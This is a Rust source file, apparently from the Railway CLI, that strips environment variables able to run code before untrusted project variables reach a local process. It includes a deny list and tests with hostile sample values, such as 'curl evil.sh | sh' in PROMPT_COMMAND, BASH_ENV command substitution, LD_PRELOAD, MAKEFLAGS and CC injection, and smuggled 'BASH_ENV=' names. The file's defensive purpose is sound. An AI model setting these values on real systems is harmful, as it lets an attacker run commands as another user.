//! Filtering for variables that cross from a Railway project into a local
//! process.
//!
//! Service variables are writable by anyone with project MEMBER access, so from
//! the perspective of the machine running the CLI they are untrusted input. Most
//! are ordinary configuration, but some names are read by the shell, dynamic
//! loader, or language runtime *during startup* and decide what code the child
//! executes. `PROMPT_COMMAND` runs before an interactive shell's first prompt;
//! `BASH_ENV` and `ENV` are expanded (so command substitution fires) before a
//! non-interactive shell runs anything. Passing those through means a
//! collaborator picks the command, and it runs as the local user.
//!
//! Four categories qualify, and the fourth is the easiest to overlook: a name
//! does not have to *contain* a command to choose one. `PATH` decides which
//! binary every bare command name resolves to, and `HOME` decides which
//! `.bashrc`/`.zshrc` an interactive shell sources — so they select code just as
//! surely as `BASH_ENV` does, and a collaborator setting either one picks what
//! runs. Anything that relocates the search for executables, libraries, or
//! startup files belongs here.
//!
//! The list only works if the name it checks is the name the child will see.
//! An `envp` entry is `name=value`, so a variable called `BASH_ENV=` reaches
//! the child as `BASH_ENV` with `=` glued onto the value, and the exact match
//! never fires. Names outside `[A-Za-z_][A-Za-z0-9_]*` are therefore dropped
//! before the list is consulted; Railway stores names verbatim, so they can
//! arrive.
//!
//! These names are dropped before any local spawn. Dropping is deliberate rather
//! than overriding: the spawn merges what survives onto the inherited
//! environment, so a dropped name leaves the local machine's own value in place
//! for the child. They are still delivered to deployed services normally — the
//! boundary is only the local machine.

use std::collections::BTreeMap;

/// Names dropped on an exact (case-insensitive) match.
const UNSAFE_NAMES: &[&str] = &[
    // Shell startup and prompt hooks — execute their value directly.
    "PROMPT_COMMAND",
    "BASH_ENV",
    "ENV",
    "SHELLOPTS",
    "BASHOPTS",
    "PS0",
    "PS1",
    "PS2",
    "PS4",
    "IFS",
    "CDPATH",
    "GLOBIGNORE",
    "ZDOTDIR",
    "FPATH",
    // Language runtime startup hooks.
    "NODE_OPTIONS",
    "NODE_REPL_EXTERNAL_MODULE",
    "PYTHONSTARTUP",
    "PYTHONPATH",
    "PYTHONHOME",
    "PYTHONUSERBASE",
    "RUBYOPT",
    "RUBYLIB",
    "PERL5OPT",
    "PERL5LIB",
    "PERL5DB",
    "PERLLIB",
    "JAVA_TOOL_OPTIONS",
    "_JAVA_OPTIONS",
    "JDK_JAVA_OPTIONS",
    "CLASSPATH",
    "GEM_HOME",
    "GEM_PATH",
    "LUA_PATH",
    "LUA_CPATH",
    "R_PROFILE",
    "R_PROFILE_USER",
    "PSMODULEPATH",
    "NODE_PATH",
    "OPENSSL_CONF",
    "OPENSSL_MODULES",
    "OPENSSL_ENGINES",
    "DOTNET_STARTUP_HOOKS",
    "DOTNET_ADDITIONAL_DEPS",
    "GCONV_PATH",
    "LOCPATH",
    "PHPRC",
    "PHP_INI_SCAN_DIR",
    "JAVA_HOME",
    // Build tools: which compiler or wrapper runs, and where packages and
    // toolchains are fetched from.
    "MAKEFLAGS",
    "MAKEFILES",
    "MFLAGS",
    "GNUMAKEFLAGS",
    // make's implicit rules shell-expand these, so `CC=touch x; cc` runs on
    // any make-driven C build; the flag variables can load compiler plugins.
    "CC",
    "CXX",
    "CPP",
    "LD",
    "AR",
    "AS",
    "CFLAGS",
    "CXXFLAGS",
    "CPPFLAGS",
    "LDFLAGS",
    "PKG_CONFIG",
    "PKG_CONFIG_PATH",
    "PKG_CONFIG_LIBDIR",
    "RUSTC",
    "RUSTC_WRAPPER",
    "RUSTC_WORKSPACE_WRAPPER",
    "GOFLAGS",
    "GOPROXY",
    "GOSUMDB",
    "GONOSUMDB",
    "GONOSUMCHECK",
    "GOINSECURE",
    "GOPRIVATE",
    "GOTOOLCHAIN",
    "GOPATH",
    "GOROOT",
    // The CLI's own environment switch; a nested `railway` should keep the
    // local machine's setting.
    "RAILWAY_ENV",
    // Where executables, libraries and startup files are searched for. These
    // name no command themselves; they decide which one a bare name resolves
    // to, or which startup file gets sourced.
    "PATH",
    "HOME",
    "USERPROFILE",
    "SHELL",
    "XDG_CONFIG_HOME",
    "XDG_DATA_HOME",
    "GIT_EXEC_PATH",    // which git-* helpers run
    "GIT_TEMPLATE_DIR", // hooks copied into new repos
    "GIT_DIR",          // whose config and hooks apply
    "GIT_COMMON_DIR",
    // Tools that take a command in an environment variable.
    "GIT_SSH",
    "GIT_SSH_COMMAND",
    "GIT_EXTERNAL_DIFF",
    "GIT_PAGER",
    "GIT_EDITOR",
    "GIT_SEQUENCE_EDITOR",
    "GIT_ASKPASS",
    "GIT_PROXY_COMMAND",
    "SSH_ASKPASS",
    "PAGER",
    "EDITOR",
    "VISUAL",
    "MANPAGER",
    "LESSOPEN",
    "LESSCLOSE",
];

/// Names dropped on a (case-insensitive) prefix match. Covers the dynamic
/// loader families and exported shell functions, which are open-ended.
const UNSAFE_PREFIXES: &[&str] = &[
    "LD_",        // LD_PRELOAD, LD_AUDIT, LD_LIBRARY_PATH, ...
    "DYLD_",      // macOS equivalents
    "BASH_FUNC_", // exported shell functions
    // git reads its whole config out of the environment when asked:
    // GIT_CONFIG_COUNT with GIT_CONFIG_KEY_<n>/GIT_CONFIG_VALUE_<n> sets any
    // key — including `core.pager` and `core.sshCommand`, which execute — with
    // no file involved. The <n> makes the family open-ended, so it needs a
    // prefix; GIT_CONFIG/GIT_CONFIG_GLOBAL/GIT_CONFIG_SYSTEM fall under it too.
    "GIT_CONFIG",
    // Package manager config read from the environment: registry, index and
    // script-shell settings all live under these.
    "NPM_CONFIG_",
    "YARN_",
    "PNPM_",
    "COREPACK_",
    "PIP_",
    "LUA_INIT", // LUA_INIT and the versioned LUA_INIT_5_x forms
];

/// Portable environment variable name. Anything else cannot be passed through
/// `envp` as itself: `=` ends the name early, NUL ends the entry, and a shell
/// cannot even address the rest.
fn is_valid_name(name: &str) -> bool {
    let mut bytes = name.bytes();
    matches!(bytes.next(), Some(b'A'..=b'Z' | b'a'..=b'z' | b'_'))
        && bytes.all(|b| b.is_ascii_alphanumeric() || b == b'_')
}

fn is_unsafe(name: &str) -> bool {
    // Compare bytes, not a string slice: `&name[..p.len()]` panics when the
    // prefix length lands inside a multi-byte character, and a variable name is
    // remote input.
    UNSAFE_NAMES.iter().any(|n| n.eq_ignore_ascii_case(name))
        || UNSAFE_PREFIXES.iter().any(|p| {
            name.len() >= p.len() && name.as_bytes()[..p.len()].eq_ignore_ascii_case(p.as_bytes())
        })
}

/// Removes variables that would let the remote value choose what the child
/// process executes, and names that would not survive the trip into `envp`
/// intact. Returns the dropped names, sorted, so the caller can tell the user
/// what was withheld instead of silently losing a variable.
pub fn strip_unsafe_host_vars(variables: &mut BTreeMap<String, String>) -> Vec<String> {
    let dropped: Vec<String> = variables
        .keys()
        .filter(|name| !is_valid_name(name) || is_unsafe(name))
        .cloned()
        .collect();

    for name in &dropped {
        variables.remove(name);
    }

    dropped
}

/// One notice line per dropped name, saying why. Invalid names are printed
/// `{:?}`-quoted so a `=`, NUL or control byte in them stays visible.
pub fn dropped_notices(dropped: &[String]) -> Vec<String> {
    dropped
        .iter()
        .map(|name| {
            if is_valid_name(name) {
                format!("Skipped service variable {name}: it can execute code in a local process")
            } else {
                format!("Skipped service variable {name:?}: not a valid environment variable name")
            }
        })
        .collect()
}

#[cfg(test)]
mod tests {
    use super::*;

    fn map(pairs: &[(&str, &str)]) -> BTreeMap<String, String> {
        pairs
            .iter()
            .map(|(k, v)| ((*k).to_string(), (*v).to_string()))
            .collect()
    }

    #[test]
    fn strips_shell_startup_hooks() {
        let mut vars = map(&[
            ("PROMPT_COMMAND", "curl evil.sh | sh"),
            ("BASH_ENV", "$(id > /tmp/pwned)"),
            ("ENV", "$(id)"),
            ("DATABASE_URL", "postgres://localhost/app"),
        ]);

        let dropped = strip_unsafe_host_vars(&mut vars);

        assert_eq!(dropped, vec!["BASH_ENV", "ENV", "PROMPT_COMMAND"]);
        assert_eq!(vars.len(), 1);
        assert!(vars.contains_key("DATABASE_URL"));
    }

    #[test]
    fn strips_loader_and_runtime_families() {
        let mut vars = map(&[
            ("LD_PRELOAD", "/tmp/x.so"),
            ("DYLD_INSERT_LIBRARIES", "/tmp/x.dylib"),
            ("BASH_FUNC_ls%%", "() { :; }; id"),
            ("NODE_OPTIONS", "--require /tmp/x.js"),
            ("PERL5OPT", "-Mevil"),
            ("PORT", "3000"),
        ]);

        let dropped = strip_unsafe_host_vars(&mut vars);

        assert_eq!(dropped.len(), 5);
        assert_eq!(vars.keys().collect::<Vec<_>>(), vec!["PORT"]);
    }

    #[test]
    fn matching_ignores_case() {
        let mut vars = map(&[("prompt_command", "id"), ("ld_preload", "/tmp/x.so")]);

        assert_eq!(strip_unsafe_host_vars(&mut vars).len(), 2);
        assert!(vars.is_empty());
    }

    #[test]
    fn a_multibyte_name_does_not_panic() {
        // The prefix check slices by byte length; a name whose second byte is
        // mid-character would panic on a string slice. These are not valid
        // names either, so they are dropped rather than forwarded.
        let mut vars = map(&[
            ("L\u{00d0}_X", "v"),
            ("\u{00e9}", "v"),
            ("DYL\u{00d0}_X", "v"),
        ]);
        assert_eq!(strip_unsafe_host_vars(&mut vars).len(), 3);
        assert!(vars.is_empty());
    }

    #[test]
    fn drops_names_that_would_not_reach_the_child_intact() {
        // `BASH_ENV=` with value `=$(…)` is spawned as the envp entry
        // `BASH_ENV==$(…)`; the child reads it as BASH_ENV and the exact-name
        // check never saw it. Anything outside [A-Za-z_][A-Za-z0-9_]* goes.
        let mut vars = map(&[
            ("BASH_ENV=", "=$(touch /tmp/pwned-bashenv-eq)"),
            ("PROMPT_COMMAND=", "=touch /tmp/pwned-pc-eq"),
            ("", "empty"),
            ("1ABC", "leading digit"),
            ("A B", "space"),
            ("A-B", "dash"),
            ("A.B", "dot"),
            ("A\0B", "nul"),
            ("_OK", "1"),
            ("ok_lower", "1"),
            ("OK_123", "1"),
        ]);

        let dropped = strip_unsafe_host_vars(&mut vars);

        assert_eq!(
            dropped,
            vec![
                "",
                "1ABC",
                "A\0B",
                "A B",
                "A-B",
                "A.B",
                "BASH_ENV=",
                "PROMPT_COMMAND="
            ]
        );
        assert_eq!(
            vars.keys().collect::<Vec<_>>(),
            vec!["OK_123", "_OK", "ok_lower"]
        );
    }

    #[test]
    fn strips_the_toolchain_names_that_reached_the_child() {
        // Names that passed the list unfiltered: MAKEFLAGS fires before any
        // makefile, CC on any make-driven C build, PS0 before each command.
        let mut vars = map(&[
            ("MAKEFLAGS", "--eval=$(shell touch /tmp/pwned-makeflags)"),
            ("MAKEFILES", "/tmp/evil.mk"),
            ("CC", "touch /tmp/pwned-cc; cc"),
            ("CXX", "touch /tmp/pwned-cxx; c++"),
            ("CFLAGS", "-fplugin=/tmp/x.so"),
            ("LDFLAGS", "-plugin /tmp/x.so"),
            ("PKG_CONFIG_PATH", "/tmp/pc"),
            ("PS0", "$(touch /tmp/pwned-ps0)"),
            ("GIT_PROXY_COMMAND", "touch /tmp/pwned-gitproxy"),
            ("GIT_ASKPASS", "/tmp/evil"),
            ("GIT_DIR", "/tmp/evil-repo"),
            ("GOPATH", "/tmp/go"),
            ("PNPM_HOME", "/tmp/pnpm"),
            ("COREPACK_NPM_REGISTRY", "http://127.0.0.1:1/"),
            ("NPM_CONFIG_REGISTRY", "http://127.0.0.1:1/"),
            ("PIP_INDEX_URL", "http://127.0.0.1:1/simple"),
            ("DATABASE_URL", "postgres://localhost/app"),
            ("GIT_BRANCH", "main"),
        ]);

        let dropped = strip_unsafe_host_vars(&mut vars);

        assert_eq!(dropped.len(), 16);
        assert_eq!(
            vars.keys().collect::<Vec<_>>(),
            vec!["DATABASE_URL", "GIT_BRANCH"]
        );
    }

    #[test]
    fn strips_execution_search_and_startup_file_locations() {
        // The category that decides which code runs without naming any command.
        let mut vars = map(&[
            ("PATH", "/tmp/attacker-bin"),
            ("HOME", "."),
            ("SHELL", "/tmp/evil-sh"),
            ("XDG_CONFIG_HOME", "/tmp/attacker-config"),
            ("DATABASE_URL", "postgres://localhost/app"),
        ]);

        let dropped = strip_unsafe_host_vars(&mut vars);

        assert_eq!(dropped.len(), 4);
        assert_eq!(vars.keys().collect::<Vec<_>>(), vec!["DATABASE_URL"]);
    }

    #[test]
    fn strips_the_open_ended_git_config_family() {
        // GIT_CONFIG_KEY_<n> can set core.pager or core.sshCommand, so the whole
        // prefix goes even though the individual names are unbounded.
        let mut vars = map(&[
            ("GIT_CONFIG_COUNT", "1"),
            ("GIT_CONFIG_KEY_0", "core.pager"),
            ("GIT_CONFIG_VALUE_0", "id"),
            ("GIT_CONFIG_GLOBAL", "/tmp/attacker.gitconfig"),
            ("GIT_BRANCH", "main"),
        ]);

        let dropped = strip_unsafe_host_vars(&mut vars);

        assert_eq!(dropped.len(), 4);
        assert_eq!(vars.keys().collect::<Vec<_>>(), vec!["GIT_BRANCH"]);
    }

    #[test]
    fn strips_package_sources_and_build_tool_settings() {
        let mut vars = map(&[
            ("NODE_PATH", "/tmp/modules"),
            ("npm_config_registry", "http://127.0.0.1:9999/"),
            ("PIP_INDEX_URL", "http://127.0.0.1:9999/simple"),
            ("YARN_REGISTRY", "http://127.0.0.1:9999/"),
            ("MAKEFLAGS", "--eval=$(shell id)"),
            ("LUA_INIT_5_4", "os.execute('id')"),
            ("GOFLAGS", "-toolexec=/tmp/x"),
            ("RAILWAY_ENV", "dev"),
            ("DATABASE_URL", "postgres://localhost/app"),
        ]);

        let dropped = strip_unsafe_host_vars(&mut vars);

        assert_eq!(dropped.len(), 8);
        assert_eq!(vars.keys().collect::<Vec<_>>(), vec!["DATABASE_URL"]);
    }

    #[test]
    fn leaves_ordinary_variables_alone() {
        let mut vars = map(&[
            ("DATABASE_URL", "postgres://localhost/app"),
            ("ENVIRONMENT", "production"),
            ("NODE_ENV", "production"),
            ("LDAP_URL", "ldap://example.com"),
            ("PATH_PREFIX", "/api"),
            ("HOMEPAGE_URL", "https://example.com"),
            ("SHELL_TIMEOUT", "30"),
            ("GEM_API_KEY", "abc123"),
            ("EDITORIAL_MODE", "on"),
            ("GOOGLE_CLIENT_ID", "abc"),
            ("NPM_TOKEN", "abc"),
            ("PIPELINE_ID", "42"),
            ("JAVA_VERSION", "21"),
            ("RAILWAY_ENVIRONMENT", "production"),
            ("CC_EMAIL", "ops@example.com"),
            ("GIT_COMMIT_SHA", "abc123"),
        ]);

        assert!(strip_unsafe_host_vars(&mut vars).is_empty());
        assert_eq!(vars.len(), 16);
    }

    #[test]
    fn one_notice_per_dropped_name_with_its_reason() {
        assert!(dropped_notices(&[]).is_empty());

        let notices = dropped_notices(&["BASH_ENV=".to_string(), "MAKEFLAGS".to_string()]);

        assert_eq!(notices.len(), 2);
        assert!(notices[0].contains("\"BASH_ENV=\""));
        assert!(notices[0].contains("not a valid environment variable name"));
        assert!(notices[1].contains("MAKEFLAGS"));
        assert!(notices[1].contains("can execute code"));
        assert!(notices.iter().all(|n| !n.contains('\n')));
    }
}
